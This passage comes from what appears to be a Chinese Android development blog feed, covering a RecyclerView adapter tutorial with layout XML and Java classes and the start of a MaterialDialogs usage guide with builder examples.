class="hljs-attr">android:gravity</span>=<span class="hljs-string">&quot;left&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;音乐&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;30dp&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/videoName&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">&quot;5&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;120dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">&quot;center&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;无限少女&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;50dp&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="Adapter设置"><a href="#Adapter设置" class="headerlink" title="Adapter设置"></a>Adapter设置</h1><p>首先设置对应item的数据库：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyVideo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String clas;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getClas</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> clas;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setClas</span><span class="hljs-params">(String clas)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.clas = clas;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>之后设置adapter类，具体如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.ui.PlayerView;<br><span class="hljs-keyword">import</span> com.lwx.recycleractivity.Bean.MyVideo;<br><span class="hljs-keyword">import</span> com.lwx.recycleractivity.R;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyRecycleVideoAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">RecyclerView</span>.<span class="hljs-title">Adapter</span>&lt;<span class="hljs-title">MyRecycleVideoAdapter</span>.<span class="hljs-title">MyHolder</span>&gt; </span>&#123;<br>    <span class="hljs-keyword">private</span> List&lt;MyVideo&gt; lists;<span class="hljs-comment">//数据源</span><br>    <span class="hljs-keyword">private</span> OnItemClickListener onItemClickListener;<span class="hljs-comment">//预备监听</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取数据源</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyRecycleVideoAdapter</span><span class="hljs-params">(List list)</span></span>&#123;<br>        lists=list;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 供外部调用设置监听</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> onItemClickListener</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setOnItemClickListener</span><span class="hljs-params">(OnItemClickListener onItemClickListener)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.onItemClickListener = onItemClickListener;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 自定义的接口</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">OnItemClickListener</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">onItemClick</span><span class="hljs-params">(View view, <span class="hljs-keyword">int</span> position)</span></span>;<br>    &#125;<br><br>    <span class="hljs-comment">//创建ViewHolder并返回，后续布局从ViewHolder中取出</span><br>    <span class="hljs-meta">@NonNull</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> MyRecycleVideoAdapter.<span class="hljs-function">MyHolder <span class="hljs-title">onCreateViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ViewGroup parent, <span class="hljs-keyword">int</span> viewType)</span> </span>&#123;<br>        <span class="hljs-comment">//将我们的自定义布局转换为View</span><br>        View view= LayoutInflater.from(parent.getContext())<br>                .inflate(R.layout.item_video,parent,<span class="hljs-keyword">false</span>);<br>        <span class="hljs-comment">//将view传递给我们定义的ViewHolder</span><br>        MyHolder holder=<span class="hljs-keyword">new</span> MyHolder(view);<br>        <span class="hljs-keyword">return</span> holder;<br>    &#125;<br><br>    <span class="hljs-comment">//通过方法提供的ViewHolder，将数据绑定到ViewHolder中</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onBindViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> MyRecycleVideoAdapter.MyHolder holder, <span class="hljs-keyword">int</span> position)</span> </span>&#123;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 设置每个的内容</span><br><span class="hljs-comment">         */</span><br>        holder.clas.setText(lists.get(position).getClas());<br>        holder.name.setText(lists.get(position).getName());<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 点击事件处理</span><br><span class="hljs-comment">         */</span><br>        holder.itemView.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-keyword">if</span>(onItemClickListener!=<span class="hljs-keyword">null</span>)&#123;<br>                    onItemClickListener.onItemClick(v, holder.getAdapterPosition());<br>                &#125;<br>            &#125;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getItemCount</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> lists.size();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 自定义的ViewHolder</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyHolder</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">RecyclerView</span>.<span class="hljs-title">ViewHolder</span> </span>&#123;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 预备的控件</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">public</span> TextView clas;<br>        <span class="hljs-keyword">public</span> TextView name;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyHolder</span><span class="hljs-params">(View itemView)</span> </span>&#123;<br>            <span class="hljs-keyword">super</span>(itemView);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 获取具体的控件</span><br><span class="hljs-comment">             */</span><br>            clas=itemView.findViewById(R.id.videoClass);<br>            name=itemView.findViewById(R.id.videoName);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h1 id="活动的引用"><a href="#活动的引用" class="headerlink" title="活动的引用"></a>活动的引用</h1><p>最后在具体活动中引用该方面的内容。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.DividerItemDecoration;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">import</span> com.lwx.recycleractivity.Recycler.MyRecycleViewAdapter;<br><span class="hljs-keyword">import</span> com.lwx.recycleractivity.Recycler.Mydemo;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 准备的控件和其他内容</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> RecyclerView mRecycleView;<br>    <span class="hljs-keyword">private</span> MyRecycleViewAdapter mAdapter;<span class="hljs-comment">//适配器</span><br>    <span class="hljs-keyword">private</span> LinearLayoutManager mLinearLayoutManager;<span class="hljs-comment">//布局管理器</span><br>    <span class="hljs-keyword">private</span> List&lt;Mydemo&gt; mList;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 获取具体控件</span><br><span class="hljs-comment">         */</span><br>        mRecycleView=findViewById(R.id.recycler);<br>        mList = <span class="hljs-keyword">new</span> ArrayList&lt;Mydemo&gt;();<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 尝试</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-comment">//初始化数据</span><br>        initData(mList);<br>        <span class="hljs-comment">//创建布局管理器，垂直设置LinearLayoutManager.VERTICAL，水平设置LinearLayoutManager.HORIZONTAL</span><br>        mLinearLayoutManager = <span class="hljs-keyword">new</span> LinearLayoutManager(<span class="hljs-keyword">this</span>, LinearLayoutManager.VERTICAL, <span class="hljs-keyword">false</span>);<br>        <span class="hljs-comment">//创建适配器，将数据传递给适配器</span><br>        mAdapter = <span class="hljs-keyword">new</span> MyRecycleViewAdapter(mList);<br>        <span class="hljs-comment">//设置分割线</span><br>        mRecycleView.addItemDecoration(<span class="hljs-keyword">new</span> DividerItemDecoration(<span class="hljs-keyword">this</span>,<br>                DividerItemDecoration.VERTICAL));<br>        <span class="hljs-comment">//设置布局管理器</span><br>        mRecycleView.setLayoutManager(mLinearLayoutManager);<br>        <span class="hljs-comment">//设置适配器adapter</span><br>        mRecycleView.setAdapter(mAdapter);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initData</span><span class="hljs-params">(List&lt;Mydemo&gt; list)</span> </span>&#123;<br>        Mydemo tmp=<span class="hljs-keyword">new</span> Mydemo();<br>        tmp.Video(<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;音乐&quot;</span>);<br>        list.add(tmp);<br>        Mydemo tmp2=<span class="hljs-keyword">new</span> Mydemo();<br>        tmp2.Video(<span class="hljs-string">&quot;12&quot;</span>,<span class="hljs-string">&quot;音乐&quot;</span>);<br>        list.add(tmp2);<br>        Mydemo tmp3=<span class="hljs-keyword">new</span> Mydemo();<br>        tmp3.Video(<span class="hljs-string">&quot;23&quot;</span>,<span class="hljs-string">&quot;音乐&quot;</span>);<br>        list.add(tmp3);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">showToast</span><span class="hljs-params">(String string)</span></span>&#123;<br>        Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>,string,Toast.LENGTH_SHORT).show();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>AndroidStudio RecycleView</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio RecycleView</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MaterialDialogs</title>
    <link href="/2021/05/29/AndroidStudio/%E4%BA%A4%E4%BA%92%E5%BC%B9%E7%AA%97/MaterialDialogs/"/>
    <url>/2021/05/29/AndroidStudio/%E4%BA%A4%E4%BA%92%E5%BC%B9%E7%AA%97/MaterialDialogs/</url>
    
    <content type="html"><![CDATA[<h1 id="MaterialDialogs"><a href="#MaterialDialogs" class="headerlink" title="MaterialDialogs"></a>MaterialDialogs</h1><p><a href="https://blog.csdn.net/qq_39652726/article/details/81262061">参考链接</a></p><h1 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h1><p>core版：可以创建basic, list, single/multi choice, progress, input等弹框。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">implementation &#x27;com.afollestad.material-dialogs:core:0.9.6.0&#x27;<br></code></pre></div></td></tr></table></figure><p>common版：可以创建更多拓展的弹框包括ColorChooserDialog, FolderChooserDialog, the Material Preference classes, and MaterialSimpleListAdapter/MaterialSimpleListItem等等。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">implementation &#x27;com.afollestad.material-dialogs:commons:0.9.6.0&#x27;<br></code></pre></div></td></tr></table></figure><h1 id="基础功能展示"><a href="#基础功能展示" class="headerlink" title="基础功能展示"></a>基础功能展示</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .content(<span class="hljs-string">&quot;内容&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        .negativeText(<span class="hljs-string">&quot;取消&quot;</span>)<br>        .show();<br></code></pre></div></td></tr></table></figure><img src="https://img-blog.csdn.net/2018072709451964?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"><p>2、取消弹框</p><p>得这样new</p><p>MaterialDialog dialog = new MaterialDialog.Builder(this)</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">.title(R.string.title)<br>.content(R.string.content)<br>.positiveText(R.string.agree)<br>.show();<br></code></pre></div></td></tr></table></figure><p>这样取消</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br>dialog.dismiss();<br><br></code></pre></div></td></tr></table></figure><p>3、添加图标</p><img src="https://img-blog.csdn.net/20180727095557495?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .content(<span class="hljs-string">&quot;内容&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        .negativeText(<span class="hljs-string">&quot;取消&quot;</span>)<br>        .icon(getResources().getDrawable(R.drawable.ic_account_circle_black_24dp))<br>        .show();<br></code></pre></div></td></tr></table></figure><p>可以用maxIconSize(int size)限制最大size<br>4、自适应按钮</p><p>如果按钮太长，它会自动纵向排列<br><img src="https://img-blog.csdn.net/20180727100309819?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .content(<span class="hljs-string">&quot;内容&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认确认确认确认确认确认确认确认确认确认&quot;</span>)<br>        .negativeText(<span class="hljs-string">&quot;取消取消取消取消取消取消取消取消取消取消&quot;</span>)<br>        .icon(getResources().getDrawable(R.drawable.ic_account_circle_black_24dp))<br>        .show();<br></code></pre></div></td></tr></table></figure><p>5、中立按钮</p><p>除了确认类和取消类按钮还有中立按钮，它会在最左边<br><img src="https://img-blog.csdn.net/20180727100953285?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .content(<span class="hljs-string">&quot;内容&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        .negativeText(<span class="hljs-string">&quot;取消&quot;</span>)<br>        .neutralText(<span class="hljs-string">&quot;更多&quot;</span>)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>6、回调</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .content(<span class="hljs-string">&quot;内容&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        .negativeText(<span class="hljs-string">&quot;取消&quot;</span>)<br>        .neutralText(<span class="hljs-string">&quot;更多&quot;</span>)<br>        .onPositive(<span class="hljs-keyword">new</span> MaterialDialog.SingleButtonCallback() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(MaterialDialog dialog, DialogAction which)</span> </span>&#123;<br>                <span class="hljs-comment">// TODO</span><br>            &#125;<br>        &#125;)<br>        .onNeutral(<span class="hljs-keyword">new</span> MaterialDialog.SingleButtonCallback() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(MaterialDialog dialog, DialogAction which)</span> </span>&#123;<br>                <span class="hljs-comment">// TODO</span><br>            &#125;<br>        &#125;)<br>        .onNegative(<span class="hljs-keyword">new</span> MaterialDialog.SingleButtonCallback() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(MaterialDialog dialog, DialogAction which)</span> </span>&#123;<br>                <span class="hljs-comment">// TODO</span><br>            &#125;<br>        &#125;)<br>        .show();<br></code></pre></div></td></tr></table></figure><p>如果你想监听三种动作按钮，只用一个onAny就行了，which会告诉你点击了什么按钮，根据需要去判断</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .content(<span class="hljs-string">&quot;内容&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        .negativeText(<span class="hljs-string">&quot;取消&quot;</span>)<br>        .neutralText(<span class="hljs-string">&quot;更多&quot;</span>)<br>        .onAny(<span class="hljs-keyword">new</span> MaterialDialog.SingleButtonCallback() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(MaterialDialog dialog, DialogAction which)</span> </span>&#123;<br>                Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>, which.toString(), Toast.LENGTH_SHORT).show();<br>            &#125;<br>        &#125;)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180727101804802?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"><br>7、CheckBox</p><p><img src="https://img-blog.csdn.net/20180727104332398?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .content(<span class="hljs-string">&quot;内容&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        